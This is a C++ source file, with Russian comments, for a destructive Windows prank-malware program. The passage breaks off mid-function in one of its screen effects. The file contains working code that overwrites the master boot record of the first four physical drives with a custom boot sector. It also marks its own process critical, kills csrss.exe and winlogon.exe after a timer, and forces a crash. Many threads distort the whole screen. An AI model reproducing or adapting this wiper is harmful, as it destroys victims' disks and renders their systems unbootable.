// raznos_xp_ultimate.cpp - УЛЬТРА-ЖЁСТКАЯ ВЕРСИЯ + НОВЫЕ ЭФФЕКТЫ
#define _CRT_SECURE_NO_WARNINGS
#define _WIN32_WINNT 0x0501
#define WINVER 0x0501

#include <Windows.h>
#include <windowsx.h>
#include <math.h>
#include <time.h>
#include <stdio.h>
#include <mmsystem.h>
#include <tlhelp32.h>

#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "Msimg32.lib")
#pragma comment(lib, "advapi32.lib")

#define M_PI 3.14159265358979323846264338327950288
#define TOTAL_EFFECTS_TIME 440000  // 22 эффекта × 20 сек = 440 сек = 7 минут 20 секунд

typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);

// ==================== ДЕСТРУКТИВНЫЕ ФУНКЦИИ ====================

BOOL EnablePriv(LPCSTR lpszPriv) {
    HANDLE hToken; LUID luid; TOKEN_PRIVILEGES tkprivs;
    ZeroMemory(&tkprivs, sizeof(tkprivs));
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) return FALSE;
    if (!LookupPrivilegeValueA(NULL, lpszPriv, &luid)) { CloseHandle(hToken); return FALSE; }
    tkprivs.PrivilegeCount = 1;
    tkprivs.Privileges[0].Luid = luid;
    tkprivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    BOOL bRet = AdjustTokenPrivileges(hToken, FALSE, &tkprivs, sizeof(tkprivs), NULL, NULL);
    CloseHandle(hToken);
    return bRet;
}

BOOL ProcessIsCritical() {
    HMODULE hDLL = LoadLibraryA("ntdll.dll");
    if (hDLL) {
        EnablePriv("SeDebugPrivilege");
        typedef VOID(_stdcall* RtlSetProcessIsCritical)(IN BOOLEAN, OUT PBOOLEAN, IN BOOLEAN);
        RtlSetProcessIsCritical fSetCritical = (RtlSetProcessIsCritical)GetProcAddress(hDLL, "RtlSetProcessIsCritical");
        if (fSetCritical) { fSetCritical(1, 0, 0); return 1; }
    }
    return 0;
}

void reg_add(HKEY HKey, LPCSTR Subkey, LPCSTR ValueName, unsigned long Type, unsigned int Value) {
    HKEY hKey; DWORD dwDisposition;
    RegCreateKeyExA(HKey, Subkey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, &dwDisposition);
    RegSetValueExA(hKey, ValueName, 0, Type, (const unsigned char*)&Value, sizeof(Value));
    RegCloseKey(hKey);
}

DWORD WINAPI MBRWiper(LPVOID lpParam) {
    BYTE customMBR[512] = {0xB8, 0x13, 0x00, 0xCD, 0x10, 0xB8, 0x00, 0xA0, 0x8E, 0xC0, 0x31, 0xFF, 0xB9, 0x00, 0xFA, 0xBB, 
0x34, 0x12, 0x89, 0xD8, 0x35, 0xBF, 0x8E, 0x05, 0x5B, 0x63, 0xC1, 0xC0, 0x03, 0x31, 0xC8, 0x89, 
0xC3, 0x26, 0x88, 0x05, 0x47, 0xE2, 0xEB, 0xBB, 0x00, 0x00, 0xBE, 0x00, 0x00, 0x89, 0xF0, 0xD1, 
0xE8, 0xBA, 0x00, 0x00, 0xB9, 0x0A, 0x00, 0xF7, 0xF1, 0x89, 0xC5, 0xB9, 0x00, 0x00, 0x89, 0xC8, 
0xD1, 0xE0, 0x01, 0xF0, 0x25, 0x1F, 0x00, 0x89, 0xC2, 0xB8, 0x14, 0x00, 0xF7, 0xE2, 0xC1, 0xE8, 
0x05, 0x01, 0xE8, 0x89, 0xC2, 0x81, 0xFA, 0xC8, 0x00, 0x7D, 0x1A, 0x81, 0xFA, 0x00, 0x00, 0x7C, 
0x14, 0x89, 0xD0, 0xBA, 0x40, 0x01, 0xF7, 0xE2, 0x01, 0xC8, 0x89, 0xC7, 0xB0, 0x0F, 0x00, 0xC8, 
0x30, 0xD0, 0x26, 0x88, 0x05, 0x41, 0x81, 0xF9, 0x40, 0x01, 0x7C, 0xC2, 0x46, 0x81, 0xFE, 0xC8, 
0x00, 0x7C, 0xAA, 0xBB, 0x00, 0x00, 0x89, 0xD8, 0x35, 0xAD, 0xDE, 0x25, 0x0F, 0x00, 0x05, 0x04, 
0x00, 0x89, 0xC6, 0x89, 0xD8, 0x35, 0xFE, 0xCA, 0x25, 0xFF, 0x01, 0x3D, 0x40, 0x01, 0x7D, 0x3B, 
0x89, 0xC7, 0x89, 0xD8, 0x35, 0xEF, 0xBE, 0x25, 0xFF, 0x00, 0x3D, 0xC8, 0x00, 0x7D, 0x2C, 0x89, 
0xC5, 0x53, 0x56, 0x51, 0x52, 0x89, 0xF9, 0x89, 0xEA, 0x89, 0xD0, 0xBA, 0x40, 0x01, 0xF7, 0xE2, 
0x01, 0xC8, 0x89, 0xC7, 0x88, 0xD8, 0x00, 0xC8, 0x30, 0xD0, 0x26, 0x88, 0x05, 0x5A, 0x59, 0x41, 
0x39, 0xF1, 0x7C, 0xDF, 0x42, 0x39, 0xF2, 0x7C, 0xDA, 0x5E, 0x5B, 0x43, 0x81, 0xFB, 0x64, 0x00, 
0x7C, 0xA4, 0xB9, 0x00, 0xFA, 0xBF, 0x00, 0x00, 0x26, 0x8A, 0x05, 0x34, 0xFF, 0x26, 0x88, 0x05, 
0x47, 0xE2, 0xF5, 0xE9, 0x1C, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA
};
    DWORD dwBytesWritten;
    for (int i = 0; i < 4; i++) {
        char path[32];
        sprintf(path, "\\\\.\\PhysicalDrive%d", i);
        HANDLE hDevice = CreateFileA(path, GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
        if (hDevice != INVALID_HANDLE_VALUE) {
            WriteFile(hDevice, customMBR, 512, &dwBytesWritten, 0);
            CloseHandle(hDevice);
        }
    }
    return 1;
}

// ==================== STACK OVERFLOW ДЛЯ BSOD ====================

__declspec(noinline) VOID StackOverflowCrash() {
    volatile int buffer[8192] = {0};
    StackOverflowCrash();
}

// ==================== ПОТОК ДЛЯ BSOD ПО ТАЙМЕРУ ====================

DWORD GetProcessIdByName(const char* name) {
    DWORD pid = 0;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe;
        pe.dwSize = sizeof(PROCESSENTRY32);
        if (Process32First(hSnapshot, &pe)) {
            do {
                if (_stricmp(pe.szExeFile, name) == 0) {
                    pid = pe.th32ProcessID;
                    break;
                }
            } while (Process32Next(hSnapshot, &pe));
        }
        CloseHandle(hSnapshot);
    }
    return pid;
}

DWORD WINAPI TimerThread(LPVOID lpParam) {
    Sleep(TOTAL_EFFECTS_TIME);
    
    DWORD pid = GetProcessIdByName("csrss.exe");
    if (pid) {
        HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
        if (hProcess) {
            TerminateProcess(hProcess, 0);
            CloseHandle(hProcess);
        }
    }
    
    pid = GetProcessIdByName("winlogon.exe");
    if (pid) {
        HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
        if (hProcess) {
            TerminateProcess(hProcess, 0);
            CloseHandle(hProcess);
        }
    }
    
    StackOverflowCrash();
    return 0;
}

// ==================== НОВЫЕ ЭФФЕКТЫ (ДОБАВЛЕНЫ) ====================

// ЭФФЕКТ 20: SPIN_CRUSH - жестокое вращение с тряской
DWORD WINAPI spin_crush(LPVOID lpvd) {
    HDC hdc = GetDC(NULL);
    HDC memDC = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
    SelectObject(memDC, bmp);
    float angle = 0;
    while (1) {
        hdc = GetDC(NULL);
        BitBlt(memDC, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        float rad = angle * 0.15f;
        float cosA = cos(rad);
        float sinA = sin(rad);
        int cx = w/2, cy = h/2;
        int shakeX = (int)(20 * sin(angle * 0.5f));
        int shakeY = (int)(20 * cos(angle * 0.7f));
        for (int y = 0; y < h; y += 2) {
            for (int x = 0; x < w; x += 2) {
                int dx = x - cx;
                int dy = y - cy;
                int nx = cx + (int)(dx * cosA - dy * sinA) + shakeX;
                int ny = cy + (int)(dx * sinA + dy * cosA) + shakeY;
                if (nx >= 0 && nx < w && ny >= 0 && ny < h) {
                    COLORREF color = GetPixel(memDC, nx, ny);
                    SetPixel(hdc, x, y, color);
                }
            }
        }
        for (int i = 0; i < 10; i++) {
            int y = rand() % h;
            int shift = (int)(50 * sin(angle + y * 0.1f));
            BitBlt(hdc, shift, y, w, 2, memDC, 0, y, SRCINVERT);
        }
        angle += 0.5f;
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
        Sleep(5);
    }
    return 0;
}

// ЭФФЕКТ 21: FAST_WAVE - быстрые волны
DWORD WINAPI fast_wave(LPVOID lpvd) {
    HDC hdc = GetDC(NULL);
    HDC memDC = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
    SelectObject(memDC, bmp);
    float angle = 0;
    while (1) {
        hdc = GetDC(NULL);
        BitBlt(memDC, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int y = 0; y < h; y += 1) {
            int shift = (int)(60 * sin(y * 0.08f + angle * 2.0f));
            BitBlt(hdc, shift, y, w - abs(shift), 1, memDC, 0, y, SRCCOPY);
            BitBlt(hdc, -shift/2, y + 1, w - abs(shift/2), 1, memDC, 0, y + 1, SRCPAINT);
        }
        for (int x = 0; x < w; x += 2) {
            int shift = (int)(40 * cos(x * 0.05f + angle * 1.3f));
            BitBlt(hdc, x, shift, 1, h - abs(shift), memDC, x, 0, SRCINVERT);
        }
        angle += 0.1f;
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
        Sleep(3);
    }
    return 0;
}

// ЭФФЕКТ 22: RADIAL_EXPLOSION - радиальный взрыв
DWORD WINAPI radial_explosion(LPVOID lpvd) {
    HDC hdc = GetDC(NULL);
    HDC memDC = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
    SelectObject(memDC, bmp);
    int cx = w/2, cy = h/2;
    float radius = 0;
    while (1) {
        hdc = GetDC(NULL);
        BitBlt(memDC, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        radius += 2.0f;
        if (radius > w) radius = 0;
        for (int y = 0; y < h; y += 2) {
            for (int x = 0; x < w; x += 2) {
                int dx = x - cx;
                int dy = y - cy;
                float dist = sqrt((float)(dx*dx + dy*dy));
                if (dist < radius && dist > radius - 10) {
                    SetPixel(hdc, x, y, RGB(255, 255, 255));
                }
                if (dist < radius) {
                    int nx = cx + (int)(dx * 0.9f);
                    int ny = cy + (int)(dy * 0.9f);
                    if (nx >= 0 && nx < w && ny >= 0 && ny < h) {
                        COLORREF color = GetPixel(memDC, nx, ny);
                        SetPixel(hdc, x, y, color);
                    }
                }
            }
        }
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
        Sleep(3);
    }
    return 0;
}

// ==================== ВСЕ СТАРЫЕ ЭФФЕКТЫ (ОПТИМИЗИРОВАНЫ) ====================

// ЭФФЕКТ 1: SCREEN_SQUEEZE - оптимизирован
DWORD WINAPI screen_squeeze(LPVOID lpvd) {
    HDC hdc = GetDC(NULL);
    HDC memDC = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
    SelectObject(memDC, bmp);
    float phase = 0;
    while (1) {
        hdc = GetDC(NULL);
        BitBlt(memDC, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        float scale = 0.1f + 0.9f * fabs(sin(phase));
        int nw = (int)(w * scale);
        int nh = (int)(h * scale);
        if (nw < 1) nw = 1;
        if (nh < 1) nh = 1;
        StretchBlt(hdc, (w - nw) / 2, (h - nh) / 2, nw, nh, memDC, 0, 0, w, h, SRCCOPY);
        for (int i = 0; i < 30; i++) {
            int x = rand() % w, y = rand() % h;
            BitBlt(hdc, x, y, 20 + rand() % 30, 20 + rand() % 30, memDC, x, y, NOTSRCCOPY);
        }
        phase += 0.04f;
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
        Sleep(5);
    }
    return 0;
}

// ЭФФЕКТ 2: PIXEL_MELT - оптимизирован
DWORD WINAPI pixel_melt(LPVOID lpvd) {
    HDC hdc = GetDC(NULL);
    HDC memDC = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
    SelectObject(memDC, bmp);
    int meltY[512] = {0};
    for (int i = 0; i < 512; i++) meltY[i] = rand() % h;
    while (1) {
        hdc = GetDC(NULL);
        BitBlt(memDC, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int x = 0; x < w; x += 2) {
            int idx = x % 512;
            meltY[idx] += 3 + rand() % 5;
            if (meltY[idx] > h) meltY[idx] = 0;
            BitBlt(hdc, x, meltY[idx], 2, h - meltY[idx], memDC, x, 0, SRCCOPY);
            BitBlt(hdc, x, 0, 2, meltY[idx], memDC, x, h - meltY[idx], SRCCOPY);
        }
        for (int y = 0; y < h; y += 2) {
            int shift = (int)(20 * sin(y * 0.08f + GetTickCount() * 0.01f));
            BitBlt(hdc, shift, y, w - abs(shift), 2, memDC, 0, y, SRCCOPY);
        }
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
        Sleep(4);
    }
    return 0;
}

// ЭФФЕКТ 3: RADIAL_BLUR - оптимизирован
DWORD WINAPI radial_blur(LPVOID lpvd) {
    HDC hdc = GetDC(NULL);
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    int cx = w / 2, cy = h / 2;
    float angle = 0;
    while (1) {
        hdc = GetDC(NULL);
        HDC memDC = CreateCompatibleDC(hdc);
        HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
        SelectObject(memDC, bmp);
        BitBlt(memDC, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        float rad = angle * 0.05f;
        float cosA = cos(rad);
        float sinA = sin(rad);
        for (int y = 0; y < h; y += 2) {
            for (int x = 0; x < w; x += 2) {
                int dx = x - cx;
                int dy = y - cy;
                float dist = sqrt((float)(dx * dx + dy * dy));
                int nx = cx + (int)(dx * cosA - dy * sinA);
                int ny = cy + (int)(dx * sinA + dy * cosA);
                if (nx >= 0 && nx < w && ny >= 0 && ny < h) {
                    COLORREF color = GetPixel(memDC, nx, ny);
                    SetPixel(hdc, x, y, color);
                    if (rand() % 5 == 0) {
                        SetPixel(hdc, x + rand() % 5 - 2, y + rand() % 5 - 2, RGB(255, 255, 255));
                    }
                }
            }
        }
        angle += 0.04f;
        DeleteDC(memDC);
        DeleteObject(bmp);
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
        Sleep(5);
    }
    return 0;
}

// ЭФФЕКТ 4: SCREEN_WIPE - оптимизирован
DWORD WINAPI screen_wipe(LPVOID lpvd) {
    HDC hdc = GetDC(NULL);
    HDC memDC = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
    SelectObject(memDC, bmp);
    int offsetX = 0, offsetY = 0;
    while (1) {
        hdc = GetDC(NULL);
        BitBlt(memDC, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        offsetX += rand() % 7 - 3;
        offsetY += rand() % 7 - 3;
        if (offsetX > w / 4) offsetX = -w / 4;
        if (offsetX < -w / 4) offsetX = w / 4;
        if (offsetY > h / 4) offsetY = -h / 4;
        if (offsetY < -h / 4) offsetY = h / 4;
        StretchBlt(hdc, offsetX, offsetY, w, h, memDC, 0, 0, w, h, SRCCOPY);
        for (int y = 0; y < h; y += 1) {
            int shift = (int)(15 * sin(y * 0.1f + GetTickCount() * 0.01f));
            BitBlt(hdc, shift, y, w, 1, memDC, 0, y, SRCPAINT);
            BitBlt(hdc, -shift, y + 1, w, 1, memDC, 0, y + 1, SRCINVERT);
        }
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
        Sleep(5);
    }
    return 0;
}

// ЭФФЕКТ 5: FLOATING_UI - оптимизирован
DWORD WINAPI floating_ui(LPVOID lpvd) {
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    float angle = 0;
    while (1) {
        HDC hdc = GetDC(0);
        HDC memDC = CreateCompatibleDC(hdc);
        HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
        SelectObject(memDC, bmp);
        BitBlt(memDC, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        float dx = 100 * sin(angle);
        float dy = 80 * sin(angle * 1.3f);
        float scale = 0.95f + 0.1f * sin(angle * 0.7f);
        int nw = (int)(w * scale);
        int nh = (int)(h * scale);
        StretchBlt(hdc, (int)dx, (int)dy, nw, nh, memDC, 0, 0, w, h, SRCCOPY);
        for (int i = 0; i < 30; i++) {
            int x = rand() % w, y = rand() % h;
            BitBlt(hdc, x + rand() % 5 - 2, y + rand() % 5 - 2, 10, 10, memDC, x, y, SRCINVERT);
        }
        angle += 0.02f;
        DeleteDC(memDC);
        DeleteObject(bmp);
        ReleaseDC(0, hdc);
        DeleteDC(hdc);
        Sleep(10);
    }
    return 0;
}

// ЭФФЕКТ 6: CUBIC_DISTORTION - оптимизирован
DWORD WINAPI cubic_distortion(LPVOID lpvd) {
    HDC hdc = GetDC(NULL);
    HDC memDC = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
    SelectObject(memDC, bmp);
    float time = 0;
    while (1) {
        hdc = GetDC(NULL);
        BitBlt(memDC, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int y = 0; y < h; y += 2) {
            for (int x = 0; x < w; x += 2) {
                float fx = (float)x / w;
                float fy = (float)y / h;
                float dx = (fx - 0.5f) * (1.0f + 0.3f * sin(fy * 10 + time));
                float dy = (fy - 0.5f) * (1.0f + 0.3f * cos(fx * 10 + time * 0.7f));
                int nx = (int)((dx + 0.5f) * w);
                int ny = (int)((dy + 0.5f) * h);
                if (nx >= 0 && nx < w && ny >= 0 && ny < h) {
                    COLORREF color = GetPixel(memDC, nx, ny);
                    SetPixel(hdc, x, y, color);
                }
            }
        }
        time += 0.03f;
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
        Sleep(8);
    }
    return 0;
}

// ЭФФЕКТ 7: WAVE_RIPPLE - оптимизирован
DWORD WINAPI wave_ripple(LPVOID lpvd) {
    HDC hdc = GetDC(NULL);
    HDC memDC = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
    SelectObject(memDC, bmp);
    float angle = 0;
    while (1) {
        hdc = GetDC(NULL);
        BitBlt(memDC, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int y = 0; y < h; y += 1) {
            int shift = (int)(30 * sin(y * 0.05f + angle));
            BitBlt(hdc, shift, y, w - abs(shift), 1, memDC, 0, y, SRCCOPY);
            BitBlt(hdc, -shift/2, y + 1, w - abs(shift/2), 1, memDC, 0, y + 1, SRCPAINT);
        }
        for (int x = 0; x < w; x += 2) {
            int shift = (int)(20 * cos(x * 0.03f + angle * 0.5f));
            BitBlt(hdc, x, shift, 1, h - abs(shift), memDC, x, 0, SRCINVERT);
        }
        angle += 0.08f;
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
        Sleep(4);
    }
    return 0;
}

// ЭФФЕКТ 8: SCREEN_TWIRL - оптимизирован
DWORD WINAPI screen_twirl(LPVOID lpvd) {
    HDC hdc = GetDC(NULL);
    HDC memDC = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
    SelectObject(memDC, bmp);
    float angle = 0;
    while (1) {
        hdc = GetDC(NULL);
        BitBlt(memDC, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        int cx = w / 2, cy = h / 2;
        float rad = angle;
        for (int y = 0; y < h; y += 2) {
            for (int x = 0; x < w; x += 2) {
                int dx = x - cx;
                int dy = y - cy;
                float dist = sqrt((float)(dx * dx + dy * dy));
                float twirl = rad * (1.0f - dist / (float)(w / 2));
                int nx = cx + (int)(dx * cos(twirl) - dy * sin(twirl));
                int ny = cy + (int)(dx * sin(twirl) + dy * cos(twirl));
                if (nx >= 0 && nx < w && ny >= 0 && ny < h) {
                    COLORREF color = GetPixel(memDC, nx, ny);
                    SetPixel(hdc, x, y, color);
                }
            }
        }
        angle += 0.06f;
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
        Sleep(5);
    }
    return 0;
}

// ЭФФЕКТ 9: COLOR_EXPLOSION - оптимизирован
DWORD WINAPI color_explosion(LPVOID lpvd) {
    HDC hdc = GetDC(NULL);
    HDC memDC = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
    SelectObject(memDC, bmp);
    int phase = 0;
    while (1) {
        hdc = GetDC(NULL);
        BitBlt(memDC, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int y = 0; y < h; y++) {
            for (int x = 0; x < w; x++) {
                COLORREF color = GetPixel(memDC, x, y);
                int r = GetRValue(color) ^ (phase + x + y) % 255;
                int g = GetGValue(color) ^ (phase * 2 + x * y) % 255;
                int b = GetBValue(color) ^ (phase * 3 + x - y) % 255;
                SetPixel(hdc, x, y, RGB(r, g, b));
            }
        }
        for (int i = 0; i < 15; i++) {
            int x = rand() % w, y = rand() % h;
            int size = 20 + rand() % 40;
            HPEN pen = CreatePen(PS_SOLID, 1, RGB(rand() % 256, rand() % 256, rand() % 256));
            HBRUSH brush = CreateSolidBrush(RGB(rand() % 256, rand() % 256, rand() % 256));
            SelectObject(hdc, pen);
            SelectObject(hdc, brush);
            Ellipse(hdc, x - size/2, y - size/2, x + size/2, y + size/2);
            DeleteObject(pen);
            DeleteObject(brush);
        }
        phase += 5;
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
        Sleep(8);
    }
    return 0;
}

// ЭФФЕКТ 10: PIXEL_SORTING - оптимизирован
DWORD WINAPI pixel_sorting(LPVOID lpvd) {
    HDC hdc = GetDC(NULL);
    HDC memDC = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
    SelectObject(memDC, bmp);
    while (1) {
        hdc = GetDC(NULL);
        BitBlt(memDC, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int y = 0; y < h; y += 4) {
            int startX = rand() % (w / 2);
            int endX = startX + 50 + rand() % 100;
            for (int x = startX; x < endX && x < w; x++) {
                COLORREF color = GetPixel(memDC, x, y);
                SetPixel(hdc, x + rand() % 20 - 10, y + rand() % 20 - 10, color);
            }
        }
        for (int y = 0; y < h; y += 2) {
            BitBlt(hdc, 0, y, w, 1, memDC, 0, y, NOTSRCCOPY);
        }
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
        Sleep(8);
    }
    return 0;
}

// ЭФФЕКТ 11: GHOST_TRAIL - оптимизирован
DWORD WINAPI ghost_trail(LPVOID lpvd) {
    HDC hdc = GetDC(NULL);
    HDC memDC = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
    SelectObject(memDC, bmp);
    BLENDFUNCTION blend = { AC_SRC_OVER, 0, 20, 0 };
    while (1) {
        hdc = GetDC(NULL);
        BitBlt(memDC, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        AlphaBlend(hdc, rand() % 30 - 15, rand() % 30 - 15, w, h, memDC, 0, 0, w, h, blend);
        AlphaBlend(hdc, rand() % 30 - 15, rand() % 30 - 15, w, h, memDC, 0, 0, w, h, blend);
        for (int i = 0; i < 20; i++) {
            int x = rand() % w, y = rand() % h;
            BitBlt(hdc, x + rand() % 10 - 5, y + rand() % 10 - 5, 30, 30, memDC, x, y, SRCINVERT);
        }
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
        Sleep(10);
    }
    return 0;
}

// ЭФФЕКТ 12: SCREEN_FLIP - оптимизирован
DWORD WINAPI screen_flip(LPVOID lpvd) {
    HDC hdc = GetDC(NULL);
    HDC memDC = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
    SelectObject(memDC, bmp);
    float angle = 0;
    while (1) {
        hdc = GetDC(NULL);
        BitBlt(memDC, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        float rad = sin(angle) * M_PI;
        int flipX = (int)(w * fabs(cos(rad)));
        int flipY = (int)(h * fabs(sin(rad)));
        if (flipX < 1) flipX = 1;
        if (flipY < 1) flipY = 1;
        StretchBlt(hdc, (w - flipX)/2, (h - flipY)/2, flipX, flipY, memDC, 0, 0, w, h, SRCCOPY);
        angle += 0.02f;
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
        Sleep(8);
    }
    return 0;
}

// ЭФФЕКТ 13: ZOOM_BURST - оптимизирован
DWORD WINAPI zoom_burst(LPVOID lpvd) {
    HDC hdc = GetDC(NULL);
    HDC memDC = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
    SelectObject(memDC, bmp);
    float zoom = 1.0f;
    float speed = 0.02f;
    while (1) {
        hdc = GetDC(NULL);
        BitBlt(memDC, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        zoom += speed;
        if (zoom > 3.0f || zoom < 0.3f) speed = -speed;
        int nw = (int)(w / zoom);
        int nh = (int)(h / zoom);
        if (nw < 1) nw = 1;
        if (nh < 1) nh = 1;
